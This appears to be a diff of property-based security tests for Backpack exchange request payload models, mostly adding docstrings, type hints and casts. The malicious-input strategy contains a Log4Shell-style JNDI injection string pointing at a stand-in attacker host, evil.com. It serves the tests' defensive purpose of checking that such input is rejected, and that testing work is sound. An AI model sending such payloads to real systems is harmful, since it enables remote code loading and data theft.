@@ -1,7 +1,8 @@
 """Property-based tests for Backpack raw API request payload models.
 
 These tests validate critical security boundary models that process external request payload data.
-The models tested here are essential for trading order placement, account management, and transfer operations.
+The models tested here are essential for trading order placement, account management, and
+transfer operations.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious request payload data that could manipulate trading operations
@@ -11,35 +12,31 @@ SECURITY CRITICAL: These raw models protect against:
 - Parameter manipulation that could affect order execution
 - Authentication manipulation that could affect authorization
 
-Property testing ensures comprehensive coverage of request payload edge cases and adversarial inputs.
+Property testing ensures comprehensive coverage of request payload edge cases and adversarial
+inputs.
 """
 
 from decimal import Decimal
-from typing import Any, Literal
+from typing import Any, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_api_request_payloads import (
-    BackpackRawOrderExecuteRequest,
-    BackpackRawOrderCancelRequest,
-    BackpackRawOrderCancelAllRequest,
     BackpackRawAccountWithdrawalRequest,
-    BackpackRawUpdateAccountSettingsRequest,
-    BackpackRawAccountConvertDustRequest,
     BackpackRawBorrowLendExecuteRequest,
-    BackpackRawRequestForQuoteRequest,
-    BackpackRawQuoteSubmitRequest,
-    BackpackRawQuoteAcceptRequest,
-    BackpackRawRequestForQuoteCancelRequest,
-    BackpackRawRequestForQuoteRefreshRequest,
     BackpackRawInternalTransferRequest,
+    BackpackRawOrderCancelRequest,
+    BackpackRawOrderExecuteRequest,
 )
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
+
+# Type alias for security testing malicious values
+MaliciousValue = float | bool | str | list[str] | dict[str, str] | bytes | None
 
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR REQUEST PAYLOAD MODEL TESTING
@@ -47,13 +44,15 @@ from cyberdelta.exceptions.parsing import EmptyStringError
 
 
 def financial_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for financial amounts (prices, quantities)."""
+    """Generate decimal strings for financial amounts (prices, quantities).
+
+    Returns:
+        A Hypothesis strategy for financial decimal strings.
+    """
     return st.one_of([
         # Trading amounts and prices
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("100000"), places=6).map(
-            str
-        ),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(100000), places=6).map(str),
         # Common trading values
         st.just("0"),  # Zero amount
         st.just("0.0"),  # Zero with decimal
@@ -72,17 +71,29 @@ def financial_decimal_strategy() -> SearchStrategy[str]:
 
 
 def order_type_strategy() -> SearchStrategy[str]:
-    """Generate valid order type literal values."""
+    """Generate valid order type literal values.
+
+    Returns:
+        A Hypothesis strategy for order type strings.
+    """
     return st.sampled_from(["Market", "Limit"])
 
 
 def order_side_strategy() -> SearchStrategy[str]:
-    """Generate valid order side literal values."""
+    """Generate valid order side literal values.
+
+    Returns:
+        A Hypothesis strategy for order side strings.
+    """
     return st.sampled_from(["Bid", "Ask"])
 
 
 def symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid trading symbols."""
+    """Generate valid trading symbols.
+
+    Returns:
+        A Hypothesis strategy for trading symbol strings.
+    """
     return st.one_of([
         # Common symbols
         st.just("BTC_USDC"),
@@ -105,12 +116,20 @@ def symbol_strategy() -> SearchStrategy[str]:
 
 
 def client_id_strategy() -> SearchStrategy[int]:
-    """Generate valid client ID values."""
+    """Generate valid client ID values.
+
+    Returns:
+        A Hypothesis strategy for client ID integers.
+    """
     return st.integers(min_value=1, max_value=4294967295)  # uint32 range
 
 
 def blockchain_strategy() -> SearchStrategy[str]:
-    """Generate valid blockchain literal values."""
+    """Generate valid blockchain literal values.
+
+    Returns:
+        A Hypothesis strategy for blockchain name strings.
+    """
     return st.sampled_from([
         "Arbitrum",
         "Base",
@@ -130,7 +149,11 @@ def blockchain_strategy() -> SearchStrategy[str]:
 
 
 def asset_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid asset symbol literal values."""
+    """Generate valid asset symbol literal values.
+
+    Returns:
+        A Hypothesis strategy for asset symbol strings.
+    """
     return st.sampled_from([
         "BTC",
         "ETH",
@@ -181,32 +204,56 @@ def asset_symbol_strategy() -> SearchStrategy[str]:
 
 
 def time_in_force_strategy() -> SearchStrategy[str]:
-    """Generate valid time in force literal values."""
+    """Generate valid time in force literal values.
+
+    Returns:
+        A Hypothesis strategy for time in force strings.
+    """
     return st.sampled_from(["GTC", "IOC", "FOK"])
 
 
 def self_trade_prevention_strategy() -> SearchStrategy[str]:
-    """Generate valid self trade prevention literal values."""
+    """Generate valid self trade prevention literal values.
+
+    Returns:
+        A Hypothesis strategy for self trade prevention strings.
+    """
     return st.sampled_from(["RejectTaker", "RejectMaker", "RejectBoth"])
 
 
 def trigger_by_strategy() -> SearchStrategy[str]:
-    """Generate valid trigger by literal values."""
+    """Generate valid trigger by literal values.
+
+    Returns:
+        A Hypothesis strategy for trigger by strings.
+    """
     return st.sampled_from(["LastPrice", "MarkPrice", "IndexPrice"])
 
 
 def borrow_lend_side_strategy() -> SearchStrategy[str]:
-    """Generate valid borrow/lend side literal values."""
+    """Generate valid borrow/lend side literal values.
+
+    Returns:
+        A Hypothesis strategy for borrow/lend side strings.
+    """
     return st.sampled_from(["Borrow", "Lend", "Repay", "Redeem"])
 
 
 def account_type_strategy() -> SearchStrategy[str]:
-    """Generate valid account type literal values."""
+    """Generate valid account type literal values.
+
+    Returns:
+        A Hypothesis strategy for account type strings.
+    """
     return st.sampled_from(["SPOT", "MARGIN", "FUTURES"])
 
 
 def address_strategy() -> SearchStrategy[str]:
-    """Generate valid address strings."""
+    """Generate valid address strings.
+
+    Returns:
+        A Hypothesis strategy for address strings.
+    """
     return st.one_of([
         # Common address patterns
         st.just("0x1234567890abcdef"),
@@ -224,7 +271,11 @@ def address_strategy() -> SearchStrategy[str]:
 
 
 def rfq_id_strategy() -> SearchStrategy[str]:
-    """Generate valid RFQ ID strings."""
+    """Generate valid RFQ ID strings.
+
+    Returns:
+        A Hypothesis strategy for RFQ ID strings.
+    """
     return st.one_of([
         # Common patterns
         st.just("rfq_123"),
@@ -240,15 +291,23 @@ def rfq_id_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values."""
+    """Generate valid timestamp values.
+
+    Returns:
+        A Hypothesis strategy for timestamp integers.
+    """
     return st.integers(min_value=1640995200000, max_value=2147483647000)  # Valid timestamp range
 
 
 @st.composite
-def valid_order_execute_data(draw) -> dict[str, Any]:
-    """Generate valid order execute request data."""
+def valid_order_execute_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid order execute request data.
+
+    Returns:
+        A dictionary with valid order execute request data.
+    """
     order_type = draw(order_type_strategy())
-    base_data = {
+    base_data: dict[str, Any] = {
         "orderType": order_type,
         "side": draw(order_side_strategy()),
         "symbol": draw(symbol_strategy()),
@@ -273,9 +332,13 @@ def valid_order_execute_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_order_cancel_data(draw) -> dict[str, Any]:
-    """Generate valid order cancel request data."""
-    base_data = {
+def valid_order_cancel_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid order cancel request data.
+
+    Returns:
+        A dictionary with valid order cancel request data.
+    """
+    base_data: dict[str, Any] = {
         "symbol": draw(symbol_strategy()),
     }
 
@@ -289,8 +352,12 @@ def valid_order_cancel_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_withdrawal_request_data(draw) -> dict[str, Any]:
-    """Generate valid withdrawal request data."""
+def valid_withdrawal_request_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid withdrawal request data.
+
+    Returns:
+        A dictionary with valid withdrawal request data.
+    """
     return {
         "address": draw(address_strategy()),
         "blockchain": draw(blockchain_strategy()),
@@ -300,8 +367,12 @@ def valid_withdrawal_request_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_borrow_lend_data(draw) -> dict[str, Any]:
-    """Generate valid borrow/lend request data."""
+def valid_borrow_lend_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid borrow/lend request data.
+
+    Returns:
+        A dictionary with valid borrow/lend request data.
+    """
     return {
         "quantity": draw(financial_decimal_strategy()),
         "side": draw(borrow_lend_side_strategy()),
@@ -310,8 +381,12 @@ def valid_borrow_lend_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_rfq_request_data(draw) -> dict[str, Any]:
-    """Generate valid RFQ request data."""
+def valid_rfq_request_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid RFQ request data.
+
+    Returns:
+        A dictionary with valid RFQ request data.
+    """
     base_data = {
         "symbol": draw(symbol_strategy()),
     }
@@ -326,8 +401,12 @@ def valid_rfq_request_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_internal_transfer_data(draw) -> dict[str, Any]:
-    """Generate valid internal transfer data."""
+def valid_internal_transfer_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid internal transfer data.
+
+    Returns:
+        A dictionary with valid internal transfer data.
+    """
     from_account = draw(account_type_strategy())
     to_account = draw(account_type_strategy())
 
@@ -339,8 +418,12 @@ def valid_internal_transfer_data(draw) -> dict[str, Any]:
     }
 
 
-def malicious_payload_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for request payload security testing."""
+def malicious_payload_strategy() -> SearchStrategy[MaliciousValue]:
+    """Generate malicious values for request payload security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious payload values.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-orders}"),
@@ -391,7 +474,10 @@ class TestBackpackRawOrderExecuteRequestProperties:
 
     @given(order_data=valid_order_execute_data())
     def test_order_execute_validation_success_properties(self, order_data: dict[str, Any]) -> None:
-        """Property: Valid order execute data should always create valid BackpackRawOrderExecuteRequest objects."""
+        """Property: Valid order execute data should always create valid requests.
+
+        Objects should be created successfully when valid data is provided.
+        """
         # Skip invalid decimal values
         try:
             for field in ["price", "quantity"]:
@@ -434,17 +520,18 @@ class TestBackpackRawOrderExecuteRequestProperties:
         malicious_value=malicious_payload_strategy(),
     )
     def test_order_execute_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Order execute request model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, Any] = {
             "orderType": "Limit",
             "side": "Bid",
             "symbol": "BTC_USDC",
             "price": "50000.0",
             "quantity": "1.0",
         }
-        base_data[field_name] = malicious_value
+        # Type annotation allows malicious testing - runtime will validate
+        base_data[field_name] = cast(str, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -568,7 +655,10 @@ class TestBackpackRawOrderCancelRequestProperties:
 
     @given(cancel_data=valid_order_cancel_data())
     def test_order_cancel_validation_success_properties(self, cancel_data: dict[str, Any]) -> None:
-        """Property: Valid order cancel data should always create valid BackpackRawOrderCancelRequest objects."""
+        """Property: Valid order cancel data should always create valid requests.
+
+        BackpackRawOrderCancelRequest objects should be created successfully.
+        """
         # Skip empty or invalid strings
         assume(isinstance(cancel_data["symbol"], str) and cancel_data["symbol"].strip())
         assume(len(cancel_data["symbol"].encode("utf-8")) <= 64)
@@ -591,14 +681,15 @@ class TestBackpackRawOrderCancelRequestProperties:
         malicious_value=malicious_payload_strategy(),
     )
     def test_order_cancel_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Order cancel request model should reject malicious inputs safely."""
         base_data = {
             "symbol": "BTC_USDC",
             "orderId": "order_123",
         }
-        base_data[field_name] = malicious_value
+        # Type annotation allows malicious testing - runtime will validate
+        base_data[field_name] = cast(str, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -617,7 +708,10 @@ class TestBackpackRawAccountWithdrawalRequestProperties:
     def test_withdrawal_request_validation_success_properties(
         self, withdrawal_data: dict[str, Any]
     ) -> None:
-        """Property: Valid withdrawal request data should always create valid BackpackRawAccountWithdrawalRequest objects."""
+        """Property: Valid withdrawal request data should always create valid requests.
+
+        BackpackRawAccountWithdrawalRequest objects should be created successfully.
+        """
         # Skip invalid decimal values
         try:
             decimal_val = Decimal(withdrawal_data["quantity"])
@@ -652,7 +746,7 @@ class TestBackpackRawAccountWithdrawalRequestProperties:
         malicious_value=malicious_payload_strategy(),
     )
     def test_withdrawal_request_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Withdrawal request model should reject malicious inputs safely."""
         base_data = {
@@ -661,7 +755,8 @@ class TestBackpackRawAccountWithdrawalRequestProperties:
             "quantity": "100.0",
             "symbol": "USDC",
         }
-        base_data[field_name] = malicious_value
+        # Type annotation allows malicious testing - runtime will validate
+        base_data[field_name] = cast(str, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -680,7 +775,10 @@ class TestBackpackRawBorrowLendExecuteRequestProperties:
     def test_borrow_lend_validation_success_properties(
         self, borrow_lend_data: dict[str, Any]
     ) -> None:
-        """Property: Valid borrow/lend data should always create valid BackpackRawBorrowLendExecuteRequest objects."""
+        """Property: Valid borrow/lend data should always create valid requests.
+
+        BackpackRawBorrowLendExecuteRequest objects should be created successfully.
+        """
         # Skip invalid decimal values
         try:
             decimal_val = Decimal(borrow_lend_data["quantity"])
@@ -713,7 +811,7 @@ class TestBackpackRawBorrowLendExecuteRequestProperties:
         malicious_value=malicious_payload_strategy(),
     )
     def test_borrow_lend_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Borrow/lend request model should reject malicious inputs safely."""
         base_data = {
@@ -721,7 +819,8 @@ class TestBackpackRawBorrowLendExecuteRequestProperties:
             "side": "Borrow",
             "symbol": "USDC",
         }
-        base_data[field_name] = malicious_value
+        # Type annotation allows malicious testing - runtime will validate
+        base_data[field_name] = cast(str, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -740,7 +839,10 @@ class TestBackpackRawInternalTransferRequestProperties:
     def test_internal_transfer_validation_success_properties(
         self, transfer_data: dict[str, Any]
     ) -> None:
-        """Property: Valid internal transfer data should always create valid BackpackRawInternalTransferRequest objects."""
+        """Property: Valid internal transfer data should always create valid requests.
+
+        BackpackRawInternalTransferRequest objects should be created successfully.
+        """
         # Skip invalid decimal values
         try:
             decimal_val = Decimal(transfer_data["quantity"])
@@ -774,7 +876,7 @@ class TestBackpackRawInternalTransferRequestProperties:
         malicious_value=malicious_payload_strategy(),
     )
     def test_internal_transfer_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Internal transfer request model should reject malicious inputs safely."""
         base_data = {
@@ -783,7 +885,8 @@ class TestBackpackRawInternalTransferRequestProperties:
             "fromAccount": "SPOT",
             "toAccount": "MARGIN",
         }
-        base_data[field_name] = malicious_value
+        # Type annotation allows malicious testing - runtime will validate
+        base_data[field_name] = cast(str, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
